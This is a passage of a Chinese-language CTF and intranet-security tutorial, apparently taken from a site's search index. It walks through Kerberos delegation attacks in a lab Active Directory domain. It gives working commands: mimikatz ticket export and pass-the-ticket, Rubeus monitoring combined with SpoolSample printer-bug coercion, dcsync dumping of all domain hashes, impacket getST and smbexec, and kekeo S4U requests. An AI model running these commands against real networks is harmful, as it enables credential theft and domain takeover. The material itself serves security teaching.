msDS-AllowedToDelegateTo\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#3_2","title":"3.\u67e5\u8be2\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u6216\u670d\u52a1\u8d26\u6237","text":""},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1adfind","title":"\uff081\uff09adfind","text":"<p>\u5229\u7528 adfind \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fc7\u6ee4 <code>samAccountType</code> \u548c <code>msDS- AllowedToActOnBehalfOfOtherIdentity</code> \u5c5e\u6027\uff0c\u5373\u53ef\u67e5\u8be2\u51fa\u57df\u5185\u914d\u7f6e\u4e86\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u548c\u670d\u52a1\u8d26\u53f7\u3002\u4f7f\u7528 adfind \u67e5\u8be2\u51fa\u6765\u7684 <code>msDS- AllowedToActOnBehalfOfOtherIdentity</code> \u503c\uff0c\u7528<code>{Security Descriptor}</code>\u4ee3\u66ff\u4e86\uff0c\u8fd9\u4e2a\u503c\u5305\u542b\u4e86\u5141\u8bb8\u88ab\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u53f7\u6216\u673a\u5668\u8d26\u53f7\u7684 SID\u3002</p> <pre><code>#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\nAdFind.exe -b \"DC=xie,DC=com\" -f \"(&amp;(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))\" msDS-AllowedToActOnBehalfOfOtherIdentity\n#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u6237\nAdFind.exe -b \"DC=xie,DC=com\" -f \"(&amp;(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))\" msDS-AllowedToActOnBehalfOfOtherIdentity\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 adfind \u67e5\u8be2\u51fa\u57df\u4e2d\u914d\u7f6e\u4e86\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u6709win7\uff0c\u914d\u7f6e\u4e86\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u53f7\u6709 krbtgt\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2ldapsearch","title":"\uff082\uff09ldapsearch","text":"<p>\u5229\u7528 ldapsearch \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fc7\u6ee4 samAccountType \u548c msDS- AllowedToActOnBehalfOfOtherIdentity \u5c5e\u6027\uff0c\u5373\u53ef\u67e5\u8be2\u51fa\u57df\u5185\u914d\u7f6e\u4e86\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u548c\u670d\u52a1\u8d26\u53f7\u3002</p> <pre><code>#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\nldapsearch -x -H ldap://10.211.55.4:389 -D \"hack@xie.com\" -w P@ss1234 -b \" DC=xie,DC=com\" \"(&amp;(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))\" | grep dn\n#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u6237\nldapsearch -x -H ldap://10.211.55.4:389 -D \"hack@xie.com\" -w P@ss1234 -b \" DC=xie,DC=com\" \"(&amp;(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))\" | grep dn\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#4_1","title":"4.\u67e5\u770b\u67d0\u8d26\u6237\u662f\u5426\u5177\u6709\u59d4\u6d3e\u6027","text":"<p>\u901a\u8fc7\u4f7f\u7528 Empire \u4e0b\u7684 powerview.ps1 \u811a\u672c\u67e5\u770b\u670d\u52a1\u8d26\u53f7\u6216\u673a\u5668\u8d26\u53f7\u7684\u5c5e\u6027\uff0c\u6765\u67e5\u770b\u67d0\u8d26\u53f7\u662f\u5426\u5177\u6709\u59d4\u6d3e\u5c5e\u6027\u3002</p> <pre><code>Import-Module .\\powerview.ps1;\n#\u67e5\u770b\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u548c\u7ea6\u675f\u6027\u59d4\u6d3e\nGet-DomainUser \u57df\u7528\u6237\u540d -Properties useraccountcontrol,msds-allowedtodelegateto | fl\nGet-DomainComputer \u673a\u5668\u7528\u6237\u540d -Properties useraccountcontrol,msds-allowedtodelegateto | fl\n\n#\u67e5\u770b\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\nGet-DomainUser \u57df\u7528\u6237\u540d -Properties msDS-AllowedToActOnBehalfOfOtherIdentity\nGet-DomainComputer \u673a\u5668\u7528\u6237\u540d -Properties msDS-AllowedToActOnBehalfOfOtherIdentity\n</code></pre> <p>\u5f53\u8be5\u8d26\u53f7\u6ca1\u59d4\u6d3e\u5c5e\u6027\u65f6\uff0c\u53ea\u6709 userAccountControl \u5c5e\u6027\u6709\u503c\u3002</p> <p>\u2022 \u670d\u52a1\u8d26\u53f7\u7684\u503c\u4e3a\uff1aNORMAL_ACCOUNT \u2022 \u673a\u5668\u8d26\u53f7\u7684\u503c\u4e3a\uff1aWORKSTATION_TRUST_ACCOUNT</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6ca1\u914d\u7f6e\u59d4\u6d3e\u5c5e\u6027\u7684\u670d\u52a1\u8d26\u53f7\u7684 userAccountControl \u5c5e\u6027\u53ea\u6709NORMAL_ACCOUNT\uff0c\u6ca1\u914d\u7f6e\u59d4\u6d3e\u5c5e\u6027\u7684\u673a\u5668\u8d26\u53f7\u7684 userAccountControl \u5c5e\u6027\u53ea\u6709 WORKSTATION_TRUST_ACCOUNT\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5f53\u8d26\u53f7\u88ab\u8bbe\u7f6e\u4e3a \u975e\u7ea6\u675f\u6027\u59d4\u6d3e \u65f6\uff0c\u5176 userAccountControl \u5c5e\u6027\u4f1a\u5305\u542b\u4e3a TRUSTED_FOR_DELEGATION\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5f53\u8d26\u53f7\u88ab\u8bbe\u7f6e\u4e3a \u7ea6\u675f\u6027\u59d4\u6d3e \u65f6\uff0c\u5176 userAccountControl \u5c5e\u6027\u5305\u542bTRUSTED_TO_AUTH_FOR_DELEGATION\uff0c\u4e14 msds-allowedtodelegateto \u5c5e\u6027\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u54ea\u4e9b SPN\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5f53\u8d26\u53f7\u88ab\u8bbe\u7f6e\u4e3a \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u65f6\uff0c\u5176 msDS- AllowedToActOnBehalfOfOtherIdentity \u5c5e\u6027\u4f1a\u6709\u88ab\u5141\u8bb8\u59d4\u6d3e\u8d26\u53f7\u7684 SID\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#_7","title":"\u57df\u59d4\u6d3e\u653b\u51fb","text":"<p>\u57df\u59d4\u6d3e\u653b\u51fb\u53d1\u751f\u5728 kerberos \u534f\u8bae\u7684 <code>TGS-REQ&amp;TGS-REP</code> \u9636\u6bb5\uff0c\u53ef\u4ee5\u5206\u4e3a\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u3001\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u548c\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1_3","title":"1.\u975e\u7ea6\u675f\u59d4\u6d3e\u653b\u51fb","text":"<p>\u4ee5\u4e0b\u662f\u5b9e\u9a8c\u73af\u5883\uff1a</p> <ul> <li>\u57df\u63a7\uff1aAD01(10.211.55.4) </li> <li>\u57df\u6210\u5458\u4e3b\u673a\uff1aWin7(10.211.55.6) Server2012(10.211.55.9) </li> <li>\u57df\u7ba1\u7406\u5458\uff1atest administrator </li> <li>\u57df\u666e\u901a\u7528\u6237\uff1ahack</li> <li>\u57df\uff1axie.com</li> </ul> <p>\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u53ef\u4ee5\u5229\u7528\u670d\u52a1\u8d26\u53f7\u548c\u4e3b\u673a\u8d26\u53f7\uff0c\u56e0\u4e3a\u53ea\u6709\u670d\u52a1\u8d26\u53f7\u548c\u4e3b\u673a\u8d26\u53f7\u5177\u6709\u59d4\u6d3e\u5c5e\u6027\u3002\u57df\u7528\u6237\u8d26\u53f7\u6ce8\u518c SPN \u4e4b\u540e\u5c31\u6210\u4e3a\u4e86\u670d\u52a1\u8d26\u53f7\uff0c\u4e3b\u673a\u8d26\u53f7\u7684\u8bdd\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u53bb\u521b\u5efa\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5728\u57df\u63a7\u4e0a\u914d\u7f6e\u4e3b\u673a win7 \u5177\u6709\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u5c5e\u6027\u3002</p> <p></p> <p>\u67e5\u770b\u57df\u5185\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u8d26\u53f7\uff0c\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6709 Win7 \u673a\u5668\u3002</p> <p></p> <p>\u6ce8\uff1a\u9ed8\u8ba4\u57df\u63a7\u5236\u5668\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u3002</p> <p>\u5728 win7 \u4e0a\u8bbf\u95ee\u57df\u63a7\uff0c\u63d0\u793a\u62d2\u7edd\u8bbf\u95ee\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1_4","title":"\uff081\uff09\u8bf1\u4f7f\u57df\u7ba1\u7406\u5458\u8bbf\u95ee\u673a\u5668","text":"<p>\u6b64\u65f6\u6211\u4eec\u7528\u57df\u7ba1\u7406\u5458 test \u8eab\u4efd\u8fdc\u7a0b\u8bbf\u95ee win7 \u673a\u5668\uff0c\u8fd9\u91cc test \u767b\u5f55\u5728\u57df\u5185\u4efb\u4f55\u4e00\u53f0\u673a\u5668\u5747\u53ef\uff0c\u4e0d\u4e00\u5b9a\u975e\u5f97\u662f\u57df\u63a7\u3002\u6216\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528 ipc \u8fde\u63a5\uff0c\u5982\u4e0b\uff1a</p> <pre><code>net use \\\\win7.xie.com /user:xie\\test P@ssword1234\n</code></pre> <p>\u5982\u56fe\u57df\u7ba1\u7406\u5458 test \u8fdc\u7a0b\u8fde\u63a5 win7 \u673a\u5668\u3002</p> <p></p> <p>\u6b64\u65f6\uff0c\u5728\u4e3b\u673a win7 \u7684 lsass.exe \u5185\u5b58\u4e2d\u5c31\u4f1a\u6709\u57df\u7ba1\u7406\u5458 test \u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u3002\u6211\u4eec\u5728 win7 \u4e0a\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c mimikatz\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5bfc\u51fa\u5185\u5b58\u4e2d\u7684\u7968\u636e\uff1a</p> <pre><code>privilege::debug\n#\u5bfc\u51fa\u7968\u636e\nsekurlsa::tickets /export\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 mimikatz \u5bfc\u51fa\u5185\u5b58\u4e2d\u7684\u7968\u636e\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u4f1a\u751f\u6210\u4e00\u4e2a test@krbtgt \u7684\u7968\u636e\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u7136\u540e\u6211\u4eec\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5c06\u8fd9\u4e2a\u7968\u636e\u5bfc\u5165\u5185\u5b58\u4e2d\u3002</p> <pre><code>#\u5bfc\u5165\u7968\u636e\nkerberos::ptt [0;58cdc]-2-0-60a10000-test@krbtgt-XIE.COM.kirbi\n\n#\u67e5\u770b\u7968\u636e\nkerberos::list\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 mimikatz \u5c06\u7968\u636e\u5bfc\u5165\u5185\u5b58\u4e2d\uff0c\u7136\u540e\u8bbf\u95ee\u57df\u63a7\uff0c\u53ef\u4ee5\u770b\u5230\u5bfc\u5165\u7968\u636e\u540e\u6210\u529f\u8bbf\u95ee\u57df\u63a7\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2_3","title":"\uff082\uff09\u7ed3\u5408\u6253\u5370\u673a\u6f0f\u6d1e\u653b\u51fb","text":"<p>\u4e0a\u9762\u7684\u653b\u51fb\u624b\u6bb5\uff0c\u8fd8\u9700\u8981\u57df\u7ba1\u7406\u5458\u4e3b\u52a8\u8fde\u63a5\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\uff0c\u624d\u80fd\u4ece\u8be5\u4e3b\u673a\u4e0a\u6293\u5230\u57df\u7ba1\u7406\u5458\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u5b9e\u6218\u4e2d\u610f\u4e49\u4e0d\u5927\u3002\u4e8e\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6253\u5370\u673a\u670d\u52a1\u6f0f\u6d1e\u6765\u5f3a\u5236\u57df\u63a7\u8fde\u63a5\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\uff0c\u4e5f\u80fd\u4ece\u8be5\u4e3b\u673a\u4e0a\u6293\u5230\u57df\u63a7\u673a\u5668\u7528\u6237\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u4e14\u4e0d\u9700\u8981\u7ba1\u7406\u5458\u4ea4\u4e92\uff01</p> <p>\u5728 win7 \u4e0a\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u7528 <code>Rubeus</code> \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u6bcf\u9694\u4e00\u79d2\u76d1\u542c\u4e00\u6b21\u6765\u81ea AD01 \u4e3b\u673a\u7684\u7968\u636e\u3002</p> <pre><code>Rubeus.exe monitor /interval:1 /filteruser:AD01$\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 Rubeus \u76d1\u542c AD01 \u4e3b\u673a\u7684\u7968\u636e\u3002</p> <p></p> <p>\u7136\u540e\u5728 Win7 \u4e0a\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u4f7f\u7528\u6253\u5370\u673a\u670d\u52a1\u6f0f\u6d1e\u653b\u51fb\u57df\u63a7 AD01\uff0c\u4f7f\u5176\u5f3a\u5236\u56de\u8fde\u8ba4\u8bc1\u6211\u4eec\u7684 win7 \u4e3b\u673a\u3002</p> <pre><code>SpoolSample.exe AD01 win7\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528\u6253\u5370\u673a\u670d\u52a1\u6f0f\u6d1e\u653b\u51fb\u57df\u63a7 AD01\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684 Rubeus \u5df2\u7ecf\u6536\u5230\u6765\u81ea AD01 \u7684 base64 \u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u4e86\u3002</p> <p></p> <p>\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 Rubeus \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5bfc\u5165\u8fd9\u4e2a base64 \u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 mimikatz \u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237 hash \u4e86\u3002</p> <pre><code>Rubeus.exe ptt /ticket:base64 \u683c\u5f0f\u7684\u7968\u636e\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6ca1\u5bfc\u5165\u7968\u636e\u4e4b\u524d\uff0cmimikatz \u662f\u65e0\u6cd5\u5bfc\u51fa\u57df\u5185\u7528\u6237 hash \u7684\u3002</p> <p></p> <p>Rubeus \u5bfc\u5165\u7968\u636e\u540e\uff0c\u5c31\u53ef\u4ee5\u5bfc\u51fa\u57df\u5185\u7528\u6237 hash \u4e86\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u6216\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u5bfc\u51fa\u5185\u5b58\u4e2d\u7684\u7968\u636e\uff0c\u5bfc\u51fa\u540e\u7684\u7968\u636e\u540e\u7f00\u4e3a.kirbi\uff0c\u7136\u540e\u4f7f\u7528 mimikatz \u76f4\u63a5\u5bfc\u5165\u8fd9\u4e2a.kirbi \u7968\u636e\uff0c\u518d\u5bfc\u51fa\u57df\u5185\u7528\u6237 hash\u3002</p> <pre><code>privilege::debug\n#\u5bfc\u51fa\u7968\u636e\nsekurlsa::tickets /export\n#\u5bfc\u5165\u7968\u636e\nkerberos::ptt [0;21467]-2-1-60a10000-AD01$@krbtgt-XIE.COM.kirbi\n#\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237 hash\nlsadump::dcsync /all /csv\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5bfc\u51fa\u5185\u6b21\u4e2d\u7684\u7968\u636e\u3002</p> <p></p> <p>\u7136\u540e\u518d\u4f7f\u7528 mimikatz \u5bfc\u51fa\u7968\u636e\uff0c\u5373\u53ef\u5bfc\u51fa\u57df\u5185\u7528\u6237\u54c8\u5e0c\u4e86\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u6ce8\uff1a\u57df\u63a7\u673a\u5668\u7528\u6237\u4e0d\u80fd\u7528\u4e8e\u767b\u5f55\uff0c\u4f46\u662f\u6709 <code>Dcsync</code> \u6743\u9650\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u4e8e\u5bfc\u51fa\u57df\u5185\u7528\u6237\u54c8\u5e0c\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2_4","title":"2.\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb","text":"<p>\u4ee5\u4e0b\u662f\u5b9e\u9a8c\u73af\u5883\uff1a</p> <ul> <li>\u57df\u63a7\uff1aAD01 (10.211.55.4)</li> <li>\u57df\u6210\u5458\u4e3b\u673a\uff1aWin7 (10.211.55.6) </li> <li>\u57df\u7ba1\u7406\u5458\uff1atest</li> <li>\u670d\u52a1\u8d26\u53f7\uff1ahack</li> <li>\u57df\uff1axie.com</li> </ul> <p>\u653b\u51fb\u6d41\u7a0b\uff1a</p> <p>1\uff09\u670d\u52a1\u8d26\u53f7 hack \u4f7f\u7528\u81ea\u5df1\u7684\u8d26\u53f7\u5bc6\u7801\u5411 KDC \u7533\u8bf7\u4e00\u4e2a\u53ef\u8f6c\u53d1\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u6ce8\u610f\u5728 KDC Option \u91cc\u9762\u9009\u62e9 forwardable \u6807\u5fd7\u4f4d\uff0c\u8fd9\u6837\u7684\u8bdd\u8bf7\u6c42\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u5c31\u662f\u53ef\u8f6c\u53d1\u7684\u3002 2\uff09\u670d\u52a1\u8d26\u53f7 hack \u4ee5\u57df\u7ba1\u7406\u5458 test \u8eab\u4efd\u7533\u8bf7\u4e00\u4e2a\u9488\u5bf9\u81ea\u8eab\u670d\u52a1\u7684 ST \u670d\u52a1\u7968\u636e(\u8fd9\u4e00\u6b65\u5c31\u662f S4U2Self)\uff0c\u8fd9\u4e00\u6b65\u751f\u6210\u7684 ST \u670d\u52a1\u7968\u636e\u662f\u53ef\u8f6c\u53d1\u7684\u3002 3\uff09\u670d\u52a1\u8d26\u53f7 hack \u62ff\u7740\u4e0a\u4e00\u6b65\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\u4ee5\u57df\u7ba1\u7406\u5458 test \u8eab\u4efd\u5411 KDC\u7533\u8bf7\u8bbf\u95ee\u7279\u5b9a\u670d\u52a1(cifs/ad01.xie.com)\u7684 ST \u670d\u52a1\u7968\u636e(S4U2Proxy)\u3002 4\uff09\u5bfc\u5165\u4e0a\u4e00\u6b65\u83b7\u5f97\u7684\u4ee5\u57df\u7ba1\u7406\u5458 test \u8eab\u4efd\u8bbf\u95ee\u7279\u5b9a\u670d\u52a1(cifs/ad01.xie.com)\u7684ST \u670d\u52a1\u7968\u636e\uff0c\u5373\u53ef\u6210\u529f\u8bbf\u95ee\u57df\u63a7\u3002</p> <p>\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u53ef\u4ee5\u5229\u7528\u670d\u52a1\u8d26\u53f7\u548c\u4e3b\u673a\u8d26\u53f7\uff0c\u56e0\u4e3a\u53ea\u6709\u670d\u52a1\u8d26\u53f7\u548c\u4e3b\u673a\u8d26\u53f7\u5177\u6709\u59d4\u6d3e\u5c5e\u6027\u3002\u57df\u7528\u6237\u8d26\u53f7\u6ce8\u518c SPN \u4e4b\u540e\u5c31\u6210\u4e3a\u4e86\u670d\u52a1\u8d26\u53f7\u3002\u4e3b\u673a\u8d26\u53f7\u7684\u8bdd\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u53bb\u521b\u5efa\u3002</p> <p>\u6211\u4eec\u5c06\u57df\u7528\u6237 hack \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u6ce8\u518c\u4e3a\u67d0\u4e2a SPN \u7684\u670d\u52a1\u8d26\u53f7\u3002</p> <pre><code>#\u5c06\u57df\u7528\u6237 hack \u6ce8\u518c\u4e3a SPN SQLServer/win7.xie.com:1434 \u7684\u670d\u52a1\u8d26\u53f7\uff0c\u53ea\u6709\u673a\u5668\u8d26\u53f7\u548c\u57df\u7ba1\u7406\u5458\u8d26\u53f7\u6709\u6743\u9650\nsetspn -U -A SQLServer/win7.xie.com:1434 hack\n#\u67e5\u627e\u6307\u5b9a hack \u7528\u6237\u6ce8\u518c\u7684 SPN\nsetspn -L hack\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u7ed9 hack \u7528\u6237\u6ce8\u518c SPN\u3002</p> <p></p> <p>\u6216\u8005\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u53f7 hack2 \u4e5f\u53ef\u4ee5\uff0c\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 hack \u670d\u52a1\u8d26\u53f7\u6765\u914d\u7f6e\u7ea6\u675f\u6027\u59d4\u6d3e\u5c5e\u6027\u3002\u5728\u57df\u63a7\u4e0a\u4fee\u6539\u7528\u6237 hack \u7684\u59d4\u6d3e\u5c5e\u6027\u4e3a\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u534f\u8bae\u4e3a\u57df\u63a7 AD01 \u7684 CIFS \u534f\u8bae\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u6b64\u65f6\u6211\u4eec\u62ff\u5230\u4e86\u57df\u5185\u4e00\u53f0\u4e3b\u673a Win7 \u7684\u6743\u9650\uff0c\u8be5\u4e3b\u673a\u5f53\u524d\u767b\u5f55\u7740 xie\\hack \u7528\u6237\uff0c\u6293\u53d6\u5230\u5176\u5bc6\u7801\u4e3a P@ss1234\uff0c\u7136\u540e\u901a\u8fc7 adfind \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u53d1\u73b0 hack \u7528\u6237\u88ab\u8d4b\u4e88\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u5e76\u4e14\u59d4\u6d3e\u7684 SPN \u662f cifs/AD01.xie.com\u3002</p> <pre><code>#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u6237\uff0c\u5e76\u53ef\u4ee5\u770b\u5230\u88ab\u59d4\u6d3e\u7684 SPN\nAdFind.exe -b \"DC=xie,DC=com\" -f \"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))\" -dn\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u67e5\u8be2\u51fa hack \u7528\u6237\u88ab\u8d4b\u4e88\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u5e76\u4e14\u59d4\u6d3e\u7684 SPN \u662fcifs/AD01.xie.com\u3002</p> <p></p> <p>\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u4e86\uff0c\u5982\u4e0b\u6211\u4eec\u4f7f\u7528 impacket \u548c Rubeus \u8fdb\u884c\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1-impacket","title":"\uff081\uff09\u4f7f\u7528 impacket \u653b\u51fb","text":"<p>\u9996\u5148\uff0c\u9700\u8981\u628a\u653b\u51fb\u673a\u7684<code>/etc/resolv.conf</code> \u6587\u4ef6\u4e2d\u7684 DNS \u670d\u52a1\u5668\u6307\u5b9a\u4e3a\u57df\u63a7\u3002\u7136\u540e\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u653b\u51fb\uff1a</p> <pre><code>#\u4ee5 test \u7684\u8eab\u4efd\u7533\u8bf7\u4e00\u5f20\u8bbf\u95ee cifs/ad01.xie.com \u670d\u52a1\u7684\u7968\u636e\npython3 getST.py -dc-ip AD01.xie.com xie.com/hack:P@ss1234 -spn cifs/ad01.xie.com -impersonate test\npython3 getST.py -dc-ip AD01.xie.com xie.com/server_account:P@ss1234 -spn cifs/ad01.xie.com -impersonate administrator\n#\u5bfc\u5165\u7968\u636e\nexport KRB5CCNAME=test.ccache\npython3 smbexec.py -no-pass -k ad01.xie.com\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6267\u884c\u5b8c\u8fd9\u4e9b\u547d\u4ee4\u540e\uff0c\u5373\u53ef\u8fdc\u7a0b\u8fde\u63a5\u57df\u63a7\u5236\u5668 AD01\u3002</p> <p></p> <p>\u5982\u679c\u51fa\u73b0\u5982\u56fe\u6240\u793a\u62a5\u9519\uff0c\u5219\u662f\u56e0\u4e3a\u7ed9 hack \u7528\u6237\u914d\u7f6e\u59d4\u6d3e\u7684\u65f6\u5019\uff0c\u9009\u62e9\u7684\u662f\u4ec5\u4f7f\u7528Kerberos(K) \uff0c\u5982\u56fe\u6240\u793a\uff0c\u8fd9\u6837\u7684\u8bdd\u5c31\u4e0d\u4f1a\u8fdb\u884c\u534f\u8bae\u8f6c\u5316\uff0c\u6240\u4ee5\u62a5\u9519\u3002</p> <p></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2-kekeo","title":"\uff082\uff09\u4f7f\u7528 kekeo \u653b\u51fb","text":"<p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728 Win7 \u4e0a\u4f7f\u7528 kekeo \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u751f\u6210 ST \u670d\u52a1\u7968\u636e\uff1a</p> <pre><code>#\u4f7f\u7528 hack \u8d26\u53f7\u7533\u8bf7\u4e00\u4e2a TGT \u8ba4\u8d2d\u6743\u8bc1\ntgt::ask /user:hack /domain:xie.com /password:P@ss1234\n\n#\u4f7f\u7528\u4e0a\u4e00\u6b65\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u5229\u7528 S4U \u534f\u8bae\uff0c\u4ee5 test@xie.com \u7528\u6237\u6743\u9650\u7533\u8bf7\u4e00\u5f20\u8bbf\u95ee\ncifs/AD01.xie.com \u670d\u52a1\u7684 ST \u670d\u52a1\u7968\u636e\ntgs::s4u 